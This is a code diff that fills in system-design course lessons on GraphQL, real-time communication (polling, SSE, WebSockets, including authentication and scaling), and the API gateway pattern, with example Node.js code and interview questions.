+                                answer: "N+1 problem: Query { posts { title author { name } } } fetches posts (1 query) then loops through each post fetching author (N queries). 100 posts = 101 queries! Same problem as ORM lazy loading. DataLoader solution: Batches multiple load requests into single query. Collects all author IDs in request tick → batches into WHERE id IN (1,2,3,...) → caches results. 101 queries → 1 query. Implementation: const userLoader = new DataLoader((ids) => batchFetchUsers(ids)). Essential for production GraphQL to avoid database overload. Without DataLoader, GraphQL performs worse than REST!"
+                            },
+                            {
+                                question: "Why is caching harder in GraphQL compared to REST?",
+                                answer: "REST: Easy HTTP caching by URL. GET /api/users/123 → Cache-Control: max-age=3600. Browser/CDN caches by URL. GraphQL: Single endpoint (/graphql), POST requests, body varies. Can't cache by URL (always /graphql). Can't use HTTP caching (POST, different bodies). Solutions: 1) Client-side normalized cache (Apollo Client stores entities separately), 2) Persisted queries (send query hash in GET request for HTTP caching), 3) Server-side resolver caching (Redis). Requires custom implementation vs REST's built-in HTTP caching. GraphQL trades caching simplicity for query flexibility."
+                            },
+                            {
+                                question: "When should you use REST vs GraphQL?",
+                                answer: "Use REST: 1) Simple CRUD operations, 2) Public APIs (REST more familiar to third parties), 3) Caching critical (CDN caching works out of box), 4) File uploads/downloads, 5) Small stable APIs. Examples: Stripe payment API, Twilio SMS API. Use GraphQL: 1) Complex data requirements (nested relationships), 2) Mobile apps (bandwidth constraints, minimize over-fetching), 3) Rapid frontend iteration (add fields without backend changes), 4) Multiple clients with different needs (mobile vs web), 5) GraphQL-first teams (strong typing helps). Examples: GitHub complex queries, Shopify flexible storefronts. Many companies offer both: GitHub REST + GraphQL."
+                            }
+                        ]
                     },
                     {
                         id: 'websockets-realtime',
                         title: 'WebSockets & Real-time APIs',
                         duration: '45 min',
                         content: `
-                            <h2>OUTLINE: Real-time APIs</h2>
+                            <h2>Real-time Communication Options</h2>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>Real-time Communication Options</strong>
-                                    - Polling (simple, inefficient)
-                                    - Long polling (better, still overhead)
-                                    - Server-Sent Events (SSE) (one-way, HTTP)
-                                    - WebSockets (bi-directional, persistent)
-                                </li>
-                                <li><strong>WebSocket Protocol</strong>
-                                    - Handshake process
-                                    - Message framing
-                                    - Connection lifecycle
-                                    - Authentication
-                                </li>
-                                <li><strong>Use Cases</strong>
-                                    - Chat applications
-                                    - Live updates (stock prices, sports scores)
-                                    - Multiplayer games
-                                    - Collaborative editing
-                                </li>
-                                <li><strong>Implementation Considerations</strong>
-                                    - Scaling WebSockets
-                                    - Load balancing with sticky sessions
-                                    - Message brokers (Redis Pub/Sub)
-                                    - Fallback strategies
-                                </li>
-                            </ul>
+                            <h3>1. Polling (Simple but Inefficient)</h3>
+                            <div class="code-block">Client repeatedly requests updates at fixed intervals
 
-                            <h3>Examples to Include:</h3>
+Flow:
+Client: GET /api/messages (every 5 seconds)
+Server: Returns new messages or empty []
+
+// Client-side polling
+setInterval(() => {
+  fetch('/api/messages')
+    .then(res => res.json())
+    .then(messages => updateUI(messages));
+}, 5000);  // Poll every 5 seconds
+
+Problems:
+❌ Wasteful: Most requests return empty (no new data)
+❌ Delayed updates: Up to 5 second delay
+❌ Server load: 1000 clients × 12 req/min = 12,000 req/min
+❌ Bandwidth waste: Headers sent every request
+
+Example:
+User sends message → Takes up to 5 seconds for others to see
+Lots of requests with no new data
+
+When to use:
+✅ Simple updates (rarely change)
+✅ Low client count
+✅ Acceptable delay
+✅ Fallback when nothing else works</div>
+
+                            <h3>2. Long Polling (Better but Still Overhead)</h3>
+                            <div class="code-block">Client requests, server holds connection until new data
+
+Flow:
+1. Client: GET /api/messages
+2. Server: Holds connection open (doesn't respond)
+3. New message arrives → Server responds immediately
+4. Client: Immediately makes new request (step 1)
+
+// Server-side (Node.js)
+app.get('/api/messages', (req, res) => {
+  const checkForMessages = () => {
+    const messages = getNewMessages();
+    if (messages.length > 0) {
+      res.json(messages);
+    } else {
+      // Check again in 1 second
+      setTimeout(checkForMessages, 1000);
+    }
+  };
+
+  checkForMessages();
+
+  // Timeout after 30 seconds
+  setTimeout(() => {
+    res.json([]);
+  }, 30000);
+});
+
+Benefits vs regular polling:
+✅ Lower latency (instant when data available)
+✅ Fewer requests (only when data changes)
+
+Problems:
+❌ Connection overhead (TCP handshake per request)
+❌ Server resources (held connections)
+❌ Timeout issues (30s timeout → reconnect overhead)
+
+Use cases:
+- Chat apps (older implementations)
+- Notifications
+- When WebSocket not available</div>
+
+                            <h3>3. Server-Sent Events (SSE)</h3>
+                            <div class="code-block">One-way communication: Server pushes updates to client
+
+Protocol: HTTP-based, text/event-stream
+
+Flow:
+1. Client opens connection
+2. Server sends events as they occur
+3. Connection stays open
+4. Client auto-reconnects if disconnected
+
+// Server-side
+app.get('/api/events', (req, res) => {
+  res.setHeader('Content-Type', 'text/event-stream');
+  res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Connection', 'keep-alive');
+
+  // Send event
+  const sendEvent = (data) => {
+    res.write(\`data: \${JSON.stringify(data)}\n\n\`);
+  };
+
+  // Subscribe to events
+  eventEmitter.on('message', sendEvent);
+
+  // Cleanup on close
+  req.on('close', () => {
+    eventEmitter.off('message', sendEvent);
+  });
+});
+
+// Client-side
+const eventSource = new EventSource('/api/events');
+
+eventSource.onmessage = (event) => {
+  const data = JSON.parse(event.data);
+  console.log('New message:', data);
+};
+
+eventSource.onerror = (error) => {
+  console.error('SSE error:', error);
+};
+
+Benefits:
+✅ Simple (built on HTTP)
+✅ Auto-reconnect (browser handles it)
+✅ Event IDs (resume from last event)
+✅ Works through proxies
+✅ Lower overhead than long polling
+
+Limitations:
+❌ One-way only (server → client)
+❌ Text-only (no binary)
+❌ Limited browser connections (6 per domain)
+
+Use cases:
+- Live feeds (Twitter timeline, stock prices)
+- Notifications
+- Progress updates
+- Server logs streaming</div>
+
+                            <h3>4. WebSockets (Bi-directional, Persistent)</h3>
+                            <div class="code-block">Full-duplex communication over single TCP connection
+
+Upgrade from HTTP to WebSocket protocol
+
+Benefits:
+✅ Bi-directional (client ↔ server)
+✅ Low latency (no HTTP overhead)
+✅ Binary support (efficient)
+✅ Full-duplex (send/receive simultaneously)
+✅ Lower overhead (no headers per message)
+
+// Client-side
+const ws = new WebSocket('ws://localhost:3000');
+
+ws.onopen = () => {
+  console.log('Connected');
+  ws.send(JSON.stringify({ type: 'join', room: 'chat' }));
+};
+
+ws.onmessage = (event) => {
+  const data = JSON.parse(event.data);
+  console.log('Message:', data);
+};
+
+ws.onclose = () => {
+  console.log('Disconnected');
+};
+
+ws.onerror = (error) => {
+  console.error('WebSocket error:', error);
+};
+
+// Server-side (Node.js with ws library)
+const WebSocket = require('ws');
+const wss = new WebSocket.Server({ port: 3000 });
+
+wss.on('connection', (ws) => {
+  console.log('Client connected');
+
+  ws.on('message', (message) => {
+    const data = JSON.parse(message);
+    console.log('Received:', data);
+
+    // Broadcast to all clients
+    wss.clients.forEach((client) => {
+      if (client.readyState === WebSocket.OPEN) {
+        client.send(JSON.stringify({ type: 'message', data }));
+      }
+    });
+  });
+
+  ws.on('close', () => {
+    console.log('Client disconnected');
+  });
+});
+
+Use cases:
+- Chat applications (Slack, Discord)
+- Multiplayer games
+- Collaborative editing (Google Docs)
+- Trading platforms (real-time prices)
+- Live sports scores</div>
+
+                            <h3>Comparison Table</h3>
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Feature</th>
+                                        <th>Polling</th>
+                                        <th>Long Polling</th>
+                                        <th>SSE</th>
+                                        <th>WebSocket</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>Direction</strong></td>
+                                        <td>Client → Server</td>
+                                        <td>Client → Server</td>
+                                        <td>Server → Client</td>
+                                        <td>Bi-directional</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Protocol</strong></td>
+                                        <td>HTTP</td>
+                                        <td>HTTP</td>
+                                        <td>HTTP</td>
+                                        <td>WebSocket (ws://)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Connection</strong></td>
+                                        <td>New per request</td>
+                                        <td>Held, then new</td>
+                                        <td>Persistent</td>
+                                        <td>Persistent</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Latency</strong></td>
+                                        <td>High (up to interval)</td>
+                                        <td>Low</td>
+                                        <td>Very low</td>
+                                        <td>Very low</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Overhead</strong></td>
+                                        <td>High (headers)</td>
+                                        <td>Medium</td>
+                                        <td>Low</td>
+                                        <td>Very low</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Browser Support</strong></td>
+                                        <td>Universal</td>
+                                        <td>Universal</td>
+                                        <td>Modern browsers</td>
+                                        <td>Modern browsers</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Binary Data</strong></td>
+                                        <td>Yes</td>
+                                        <td>Yes</td>
+                                        <td>No</td>
+                                        <td>Yes</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Complexity</strong></td>
+                                        <td>Low</td>
+                                        <td>Low</td>
+                                        <td>Low</td>
+                                        <td>Medium</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Best For</strong></td>
+                                        <td>Simple updates</td>
+                                        <td>Notifications</td>
+                                        <td>Live feeds</td>
+                                        <td>Chat, games</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+
+                            <h2>WebSocket Protocol</h2>
+
+                            <h3>WebSocket Handshake</h3>
+                            <div class="code-block">Upgrade from HTTP to WebSocket
+
+Client request:
+GET /chat HTTP/1.1
+Host: server.example.com
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+
+Server response:
+HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
+
+After handshake: Connection upgraded to WebSocket protocol
+Now can send messages back and forth
+
+Sec-WebSocket-Key: Random value from client
+Sec-WebSocket-Accept: Hashed version (proves server understands WebSocket)</div>
+
+                            <h3>Message Framing</h3>
+                            <div class="code-block">WebSocket messages are framed (not raw TCP)
+
+Frame format:
+- FIN bit: Final fragment (1) or more coming (0)
+- Opcode: Text (1), Binary (2), Close (8), Ping (9), Pong (10)
+- Mask: Client-to-server must mask, server-to-client unmasked
+- Payload length: 7 bits, 16 bits, or 64 bits
+- Payload data: Actual message
+
+Text frame:
+ws.send("Hello");  // Opcode 1 (text)
+
+Binary frame:
+ws.send(new Uint8Array([1, 2, 3]));  // Opcode 2 (binary)
+
+Ping/Pong (keep-alive):
+Server sends ping → Client responds with pong
+Keeps connection alive, detects disconnects
+
+Close frame:
+ws.close(1000, "Normal closure");  // Code + reason
+
+Close codes:
+1000: Normal closure
+1001: Going away (page navigation)
+1002: Protocol error
+1003: Unsupported data
+1006: Abnormal closure (no close frame)
+1008: Policy violation
+1011: Server error</div>
+
+                            <h3>Connection Lifecycle</h3>
+                            <div class="code-block">WebSocket connection states
+
+1. CONNECTING (0): Handshake in progress
+2. OPEN (1): Connection established, can send/receive
+3. CLOSING (2): Close handshake started
+4. CLOSED (3): Connection closed
+
+// Check connection state
+if (ws.readyState === WebSocket.OPEN) {
+  ws.send('message');
+}
+
+Heartbeat (detect dead connections):
+// Server-side
+setInterval(() => {
+  wss.clients.forEach((ws) => {
+    if (ws.isAlive === false) {
+      return ws.terminate();  // Kill dead connection
+    }
+
+    ws.isAlive = false;
+    ws.ping();  // Send ping
+  });
+}, 30000);  // Every 30 seconds
+
+wss.on('connection', (ws) => {
+  ws.isAlive = true;
+
+  ws.on('pong', () => {
+    ws.isAlive = true;  // Got pong, connection alive
+  });
+});</div>
+
+                            <h3>Authentication</h3>
+                            <div class="code-block">WebSocket doesn't have built-in auth (unlike HTTP headers)
+
+Option 1: Token in URL (simple but less secure)
+const ws = new WebSocket('ws://localhost:3000?token=abc123');
+
+// Server validates
+wss.on('connection', (ws, req) => {
+  const url = new URL(req.url, 'http://localhost');
+  const token = url.searchParams.get('token');
+
+  if (!isValidToken(token)) {
+    ws.close(1008, 'Unauthorized');
+    return;
+  }
+
+  // Connection authenticated
+});
+
+Option 2: Message-based auth (better)
+const ws = new WebSocket('ws://localhost:3000');
+
+ws.onopen = () => {
+  ws.send(JSON.stringify({
+    type: 'auth',
+    token: 'abc123'
+  }));
+};
+
+// Server
+wss.on('connection', (ws) => {
+  let authenticated = false;
+
+  ws.on('message', (message) => {
+    const data = JSON.parse(message);
+
+    if (!authenticated) {
+      if (data.type === 'auth' && isValidToken(data.token)) {
+        authenticated = true;
+        ws.send(JSON.stringify({ type: 'auth_success' }));
+      } else {
+        ws.close(1008, 'Unauthorized');
+      }
+      return;
+    }
+
+    // Handle authenticated messages
+  });
+});
+
+Option 3: Cookie-based (if same origin)
+Connection inherits cookies from browser
+Server checks session cookie during handshake</div>
+
+                            <h2>Scaling WebSockets</h2>
+
+                            <h3>Load Balancing Challenge</h3>
+                            <div class="code-block">Problem: WebSocket connections are stateful
+
+User connects → Server A
+User sends message
+Load balancer routes to Server B
+→ Connection lost!
+
+Solution 1: Sticky sessions (session affinity)
+Load balancer routes same client to same server
+
+Nginx:
+upstream websocket {
+  ip_hash;  # Same IP → same server
+  server server1:3000;
+  server server2:3000;
+}
+
+ALB (AWS):
+Enable sticky sessions (target group settings)
+Uses cookies to route to same server
+
+Problem: Uneven load if one server gets many connections
+
+Solution 2: Redis Pub/Sub (share messages across servers)
+
+Server A: User1 connected
+Server B: User2 connected
+
+User1 sends message on Server A:
+1. Server A publishes to Redis: channel "chat"
+2. Server B subscribes to "chat", receives message
+3. Server B sends to User2
+
+// Server implementation
+const redis = require('redis');
+const subscriber = redis.createClient();
+const publisher = redis.createClient();
+
+// Subscribe to channels
+subscriber.subscribe('chat');
+
+subscriber.on('message', (channel, message) => {
+  // Broadcast to all connected clients on THIS server
+  wss.clients.forEach((client) => {
+    if (client.readyState === WebSocket.OPEN) {
+      client.send(message);
+    }
+  });
+});
+
+// When receiving WebSocket message
+ws.on('message', (message) => {
+  // Publish to Redis (all servers receive)
+  publisher.publish('chat', message);
+});
+
+Now works across multiple servers!</div>
+
+                            <h3>Connection Scaling</h3>
+                            <div class="code-block">WebSocket connections consume server resources
+
+One connection:
+- File descriptor
+- Memory (buffers)
+- CPU (heartbeat checks)
+
+Limits:
+Linux: ~65,000 connections per IP (port limitation)
+Node.js: Limited by file descriptors (ulimit)
+
+Scale strategies:
+1. Vertical: Bigger server (more CPU/RAM)
+2. Horizontal: More servers behind load balancer
+3. Proxy: Dedicated WebSocket proxy (handles connections)
+
+// Increase file descriptor limit
+ulimit -n 65536
+
+// Node.js cluster (use all CPU cores)
+const cluster = require('cluster');
+const numCPUs = require('os').cpus().length;
+
+if (cluster.isMaster) {
+  for (let i = 0; i < numCPUs; i++) {
+    cluster.fork();
+  }
+} else {
+  // Worker process runs WebSocket server
+  startWebSocketServer();
+}
+
+Production: 100,000+ concurrent connections possible per server</div>
+
+                            <h3>Fallback Strategies</h3>
+                            <div class="code-block">Not all environments support WebSocket (corporate firewalls, old proxies)
+
+Socket.IO: Automatic fallback
+
+Tries in order:
+1. WebSocket (best)
+2. HTTP long polling (fallback)
+
+// Client
+const socket = io('http://localhost:3000');
+
+// Automatically uses WebSocket or falls back
+
+// Server detects and handles both
+
+Library benefits:
+✅ Auto-reconnect
+✅ Room/namespace support
+✅ Built-in acknowledgments
+✅ Binary support
+✅ Fallback handling
+
+// Socket.IO example
+const io = require('socket.io')(3000);
+
+io.on('connection', (socket) => {
+  console.log('User connected:', socket.id);
+
+  socket.on('chat message', (msg) => {
+    io.emit('chat message', msg);  // Broadcast to all
+  });
+
+  socket.on('disconnect', () => {
+    console.log('User disconnected:', socket.id);
+  });
+});</div>
+
+                            <h2>Real-World Examples</h2>
+
+                            <h3>Slack Real-time Messaging</h3>
+                            <div class="code-block">Slack uses WebSocket for real-time updates
+
+Architecture:
+Client ↔ WebSocket ↔ Message Queue ↔ Slack servers
+
+Features:
+- Typing indicators
+- Presence (online/away)
+- Message delivery
+- Read receipts
+- Reactions
+
+Optimization:
+- Multiple WebSocket servers
+- Redis Pub/Sub for message distribution
+- Reconnection with backoff
+- Message queueing during disconnect
+
+User types → WebSocket message → Other users see typing indicator
+User sends message → Goes through queue → Delivered to all room members</div>
+
+                            <h3>Trading Platform</h3>
+                            <div class="code-block">Stock prices need real-time updates (WebSocket ideal)
+
+Without WebSocket:
+Poll every 1 second → 86,400 requests per day per user
+1000 users = 86 million requests per day!
+
+With WebSocket:
+1 connection per user → Push updates as prices change
+Drastically reduced server load
+
+// Server pushes price updates
+wss.on('connection', (ws) => {
+  ws.on('message', (message) => {
+    const { type, symbols } = JSON.parse(message);
+
+    if (type === 'subscribe') {
+      symbols.forEach(symbol => {
+        subscribeToSymbol(symbol, (price) => {
+          ws.send(JSON.stringify({
+            symbol,
+            price,
+            timestamp: Date.now()
+          }));
+        });
+      });
+    }
+  });
+});
+
+Client subscribes to symbols → Receives real-time updates
+10-100 updates per second per symbol</div>
+
+                            <h2>Summary</h2>
+                            <p>Real-time communication options from simple to advanced:</p>
                             <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>Slack real-time messaging</li>
-                                <li>Socket.io library</li>
-                                <li>Polling vs WebSocket comparison</li>
+                                <li><strong>Polling:</strong> Simple but wasteful, high latency, use for rare updates</li>
+                                <li><strong>Long Polling:</strong> Better than polling, lower latency, but connection overhead</li>
+                                <li><strong>SSE:</strong> One-way server push, HTTP-based, auto-reconnect, good for feeds</li>
+                                <li><strong>WebSocket:</strong> Bi-directional, low latency, low overhead, best for chat/games</li>
+                                <li>WebSocket protocol: Upgrade handshake, message framing, ping/pong for keep-alive</li>
+                                <li>Authentication: Token in URL, message-based, or cookie-based</li>
+                                <li>Scaling: Sticky sessions + Redis Pub/Sub for multi-server</li>
+                                <li>Use Socket.IO for automatic fallback (WebSocket → long polling)</li>
+                                <li>Real examples: Slack (messaging), trading platforms (live prices)</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What's the difference between polling, long polling, and WebSockets?",
+                                answer: "Polling: Client repeatedly requests at intervals (every 5s). Wasteful (most requests empty), high latency (up to interval delay), high server load. Long Polling: Client requests, server holds connection until new data, then responds. Lower latency (instant updates), fewer requests than polling, but connection overhead (reconnect after each response). WebSocket: Persistent bi-directional connection. Lowest latency, lowest overhead (no HTTP headers per message), full-duplex (send/receive simultaneously). Best for real-time. Polling: 1000 clients × 12 req/min = 12K req/min. WebSocket: 1000 persistent connections, messages only when needed. Use WebSocket for chat/games, polling for simple rare updates."
+                            },
+                            {
+                                question: "What are Server-Sent Events (SSE) and when should you use them instead of WebSockets?",
+                                answer: "SSE: One-way communication (server → client only) over HTTP. Server pushes events to client via text/event-stream. Features: Auto-reconnect (browser handles), event IDs (resume from last), works through proxies, simpler than WebSocket. Limitations: One-way only (can't send client → server), text-only (no binary), 6 connections per domain limit. Use SSE when: Only need server → client (live feeds, notifications, progress updates, stock prices, Twitter timeline). Use WebSocket when: Need bi-directional (chat, games, collaborative editing) or binary data. SSE simpler for one-way, WebSocket more powerful for two-way."
+                            },
+                            {
+                                question: "How does the WebSocket handshake work?",
+                                answer: "WebSocket starts as HTTP request then upgrades. Client sends: GET /chat HTTP/1.1, Upgrade: websocket, Connection: Upgrade, Sec-WebSocket-Key: (random value). Server responds: HTTP/1.1 101 Switching Protocols, Upgrade: websocket, Sec-WebSocket-Accept: (hashed key). After 101 response, connection upgraded from HTTP to WebSocket protocol. Now can send messages back/forth with low overhead (no HTTP headers per message). Sec-WebSocket-Key/Accept proves server understands WebSocket. Once upgraded, connection persistent until explicitly closed. URL changes: http:// → ws://, https:// → wss://"
+                            },
+                            {
+                                question: "What is the challenge of load balancing WebSockets and how do you solve it?",
+                                answer: "Challenge: WebSocket connections are stateful. User connects to Server A. Next request might go to Server B (load balancer round-robin) → connection lost! Solution 1: Sticky sessions (session affinity). Load balancer routes same client to same server via ip_hash or cookies. Problem: Uneven load. Solution 2 (better): Redis Pub/Sub. User1 on Server A, User2 on Server B. User1 sends message → Server A publishes to Redis → Server B subscribes, receives message → sends to User2. Now works across servers! All servers subscribe to Redis channels, publish messages. Scales horizontally. Production setup: Sticky sessions + Redis Pub/Sub for message distribution."
+                            },
+                            {
+                                question: "How do you authenticate WebSocket connections?",
+                                answer: "WebSocket has no built-in auth headers. Three approaches: 1) Token in URL: ws://localhost:3000?token=abc123. Simple but token visible in logs/URLs. Server validates during handshake. 2) Message-based (better): Connect first, send auth message: {type: 'auth', token: 'abc123'}. Server validates, closes if unauthorized. Blocks messages until authenticated. 3) Cookie-based: If same origin, connection inherits browser cookies. Server checks session cookie during handshake. Best: Message-based for security (token not in URL). Important: Close connection immediately if auth fails to prevent abuse. WebSocket close code 1008 = policy violation (unauthorized)."
+                            },
+                            {
+                                question: "What is Socket.IO and why would you use it instead of raw WebSockets?",
+                                answer: "Socket.IO: Library that abstracts WebSocket with fallback and extra features. Automatic fallback: Tries WebSocket first, falls back to long polling if WebSocket blocked (corporate firewalls, old proxies). Features: Auto-reconnect with backoff, room/namespace support (group messages), acknowledgments (confirm delivery), binary support, event-based API. Use when: Need fallback for compatibility, want rooms/namespaces, need auto-reconnect. Don't use when: Want lightweight (Socket.IO adds overhead), HTTP/2 or raw WebSocket sufficient. Perfect for production apps needing reliability. Handles edge cases (reconnection, fallback) that raw WebSocket requires manual implementation."
+                            }
+                        ]
                     },
                     {
                         id: 'api-gateway',
                         title: 'API Gateway Pattern',
                         duration: '45 min',
                         content: `
-                            <h2>OUTLINE: API Gateway</h2>
+                            <h2>What is an API Gateway?</h2>
+                            <p>An API Gateway is a server that acts as a single entry point for all clients to access backend services. It sits between clients and microservices, routing requests and providing cross-cutting functionality.</p>
 
-                            <h3>Topics to Cover:</h3>
+                            <div class="code-block">Without API Gateway:
+Mobile App → Service A (Auth)
+           → Service B (Users)
+           → Service C (Orders)
+           → Service D (Products)
+
+Each service:
+- Different URLs/ports
+- Own authentication
+- Own rate limiting
+- Direct exposure
+
+Problems:
+❌ Clients know about all services
+❌ Duplicated cross-cutting concerns (auth, rate limiting)
+❌ Complex client code
+❌ Hard to change backend without breaking clients
+
+With API Gateway:
+Mobile App → API Gateway → Service A
+                         → Service B
+                         → Service C
+                         → Service D
+
+Benefits:
+✅ Single entry point (one URL)
+✅ Centralized cross-cutting concerns
+✅ Simple client code
+✅ Backend changes don't break clients
+✅ Protocol translation (HTTP → gRPC)
+✅ Request aggregation</div>
+
+                            <h2>API Gateway Responsibilities</h2>
+
+                            <h3>1. Request Routing</h3>
+                            <div class="code-block">Route requests to appropriate backend services
+
+// Kong configuration
+routes:
+  - paths: ["/api/users"]
+    service: user-service
+  - paths: ["/api/products"]
+    service: product-service
+  - paths: ["/api/orders"]
+    service: order-service
+
+GET /api/users/123
+→ Gateway routes to: http://user-service:3000/users/123
+
+Path rewriting:
+GET /api/v1/products/456
+→ Rewrite to: http://product-service:5000/items/456
+
+Regex routing:
+/api/users/(\d+)/orders → user-service
+/api/orders/(\d+) → order-service
+
+Dynamic routing:
+if (header['X-Version'] === '2') {
+  route to service-v2
+} else {
+  route to service-v1
+}</div>
+
+                            <h3>2. Authentication & Authorization</h3>
+                            <div class="code-block">Centralized auth at gateway
+
+Without gateway:
+Every service implements auth checking
+→ Duplicated code, inconsistent security
+
+With gateway:
+Gateway validates token once
+Passes user info to services
+
+// Gateway validates JWT
+const token = req.headers.authorization;
+const user = jwt.verify(token, PUBLIC_KEY);
+
+// Add user to headers
+req.headers['X-User-Id'] = user.id;
+req.headers['X-User-Role'] = user.role;
+
+// Route to service
+proxyToService(req);
+
+// Service trusts gateway headers (internal network)
+app.get('/api/data', (req, res) => {
+  const userId = req.headers['x-user-id'];  // From gateway
+  // No auth checking needed!
+  const data = getDataForUser(userId);
+  res.json(data);
+});
+
+Benefits:
+✅ Auth logic in one place
+✅ Services don't need auth code
+✅ Consistent security policies
+✅ Easy to update auth strategy</div>
+
+                            <h3>3. Rate Limiting</h3>
+                            <div class="code-block">Centralized rate limiting
+
+Per client:
+Gateway: 1000 requests/hour per API key
+Services: No rate limiting needed
+
+Per endpoint:
+GET /api/search → 10 req/min (expensive)
+GET /api/users → 100 req/min (cheap)
+
+// Kong rate limiting plugin
+plugins:
+  - name: rate-limiting
+    config:
+      minute: 100
+      hour: 1000
+      policy: local
+
+Benefits:
+✅ Protect all services at once
+✅ Consistent limits
+✅ Per-client tracking
+✅ Services don't implement rate limiting</div>
+
+                            <h3>4. Request/Response Transformation</h3>
+                            <div class="code-block">Modify requests/responses on the fly
+
+Add headers:
+Client → Gateway (adds headers) → Service
+
+req.headers['X-Request-Id'] = generateId();
+req.headers['X-Gateway-Time'] = Date.now();
+
+Remove sensitive headers:
+Service → Gateway (removes headers) → Client
+
+delete res.headers['X-Internal-Token'];
+delete res.headers['X-Database-Host'];
+
+Transform response:
+// Service returns: {user_id: 123, user_name: "John"}
+// Gateway transforms to: {id: 123, name: "John"}
+
+// Also: XML → JSON, gRPC → REST, etc.
+
+Response aggregation:
+GET /api/dashboard
+→ Gateway calls: GET /users/123, GET /orders?userId=123, GET /analytics
+→ Combines responses into single JSON
+→ Client gets everything in one request
+
+// BFF pattern (Backend for Frontend)
+Removes need for client to make multiple requests</div>
+
+                            <h3>5. Caching</h3>
+                            <div class="code-block">Cache responses at gateway
+
+GET /api/products → Gateway checks cache
+→ Hit: Return cached response
+→ Miss: Call service, cache result, return
+
+// Kong caching plugin
+plugins:
+  - name: proxy-cache
+    config:
+      cache_ttl: 300  # 5 minutes
+      cache_control: true
+
+Benefits:
+✅ Reduced backend load
+✅ Faster responses
+✅ Centralized cache management
+
+Cache invalidation:
+POST /api/products → Gateway invalidates cache for GET /api/products</div>
+
+                            <h3>6. Load Balancing</h3>
+                            <div class="code-block">Distribute traffic across service instances
+
+Service has 3 instances:
+- user-service-1 (10.0.0.1:3000)
+- user-service-2 (10.0.0.2:3000)
+- user-service-3 (10.0.0.3:3000)
+
+Gateway load balances:
+- Round robin: 1 → 2 → 3 → 1 → 2 → 3
+- Least connections: Route to instance with fewest active connections
+- Weighted: Route more traffic to bigger instances
+
+// Kong upstream
+upstreams:
+  - name: user-service
+    targets:
+      - target: 10.0.0.1:3000
+        weight: 100
+      - target: 10.0.0.2:3000
+        weight: 100
+
+Health checks:
+Gateway pings services every 30s
+Removes unhealthy instances from pool
+Re-adds when healthy again</div>
+
+                            <h3>7. Monitoring & Logging</h3>
+                            <div class="code-block">Centralized observability
+
+Gateway logs every request:
+{
+  "timestamp": "2024-01-15T10:00:00Z",
+  "method": "GET",
+  "path": "/api/users/123",
+  "status": 200,
+  "latency": 45,
+  "clientIp": "203.0.113.1",
+  "userId": "user123",
+  "service": "user-service"
+}
+
+Metrics:
+- Request rate (requests/sec)
+- Error rate (4xx, 5xx)
+- Latency (p50, p95, p99)
+- Per-endpoint metrics
+- Per-client metrics
+
+Distributed tracing:
+Gateway adds trace ID
+Propagates to all services
+Full request path visible
+
+// AWS X-Ray, Jaeger, Zipkin
+Trace: Gateway → User Service → Database
+       Gateway → Order Service → Payment Service
+See where time spent</div>
+
+                            <h3>8. SSL/TLS Termination</h3>
+                            <div class="code-block">Handle HTTPS at gateway
+
+Client → HTTPS → Gateway → HTTP → Services
+
+Gateway:
+- SSL certificate
+- HTTPS termination
+- Encryption/decryption
+
+Services:
+- HTTP only (internal network)
+- No SSL overhead
+- Simpler configuration
+
+Benefits:
+✅ Single certificate management
+✅ Reduced CPU on services (no SSL)
+✅ Easier certificate rotation
+✅ Internal traffic can be unencrypted (if secure network)</div>
+
+                            <h2>API Gateway Patterns</h2>
+
+                            <h3>Backend for Frontend (BFF)</h3>
+                            <div class="code-block">Separate gateway per client type
+
+Mobile BFF:
+- Minimal data (bandwidth constraints)
+- Aggregated responses (fewer roundtrips)
+- Mobile-specific endpoints
+
+Web BFF:
+- Full data (no bandwidth constraints)
+- Separate endpoints
+- Web-specific features
+
+Smart TV BFF:
+- Optimized for TV UI
+- Large images
+- Simplified navigation
+
+Architecture:
+Mobile App → Mobile BFF → Services
+Web App → Web BFF → Services
+TV App → TV BFF → Services
+
+Each BFF:
+- Tailored to client needs
+- Independent deployment
+- Team ownership
+
+Benefits:
+✅ Optimized per platform
+✅ Independent evolution
+✅ Teams can move fast
+
+Drawbacks:
+❌ More infrastructure
+❌ Potential duplication
+❌ Multiple deployments</div>
+
+                            <h3>Service Mesh vs API Gateway</h3>
+                            <div class="code-block">Different but complementary
+
+API Gateway:
+- North-south traffic (external → internal)
+- Single entry point for clients
+- Public-facing
+- Coarse-grained (routes to services)
+
+Service Mesh:
+- East-west traffic (internal service-to-service)
+- Sidecar proxy per service
+- Internal only
+- Fine-grained (every service call)
+
+Example architecture:
+Client → API Gateway (Kong) → Service A
+                              Service A → Service Mesh (Istio) → Service B
+                              Service B → Service Mesh → Service C
+
+API Gateway handles:
+- Client auth
+- Rate limiting
+- SSL termination
+- Public API routing
+
+Service Mesh handles:
+- Service-to-service auth (mTLS)
+- Circuit breaking
+- Retry logic
+- Traffic splitting (canary deployments)
+
+Can use both together!</div>
+
+                            <h2>API Gateway Tools & Platforms</h2>
+
+                            <h3>Kong</h3>
+                            <div class="code-block">Popular open-source API Gateway
+
+Features:
+- Plugin architecture (100+ plugins)
+- Authentication (JWT, OAuth, API keys)
+- Rate limiting, caching
+- Load balancing
+- Admin API
+- Clustering (high availability)
+
+// Kong configuration
+services:
+  - name: user-service
+    url: http://user-service:3000
+
+routes:
+  - name: users-route
+    service: user-service
+    paths: ["/api/users"]
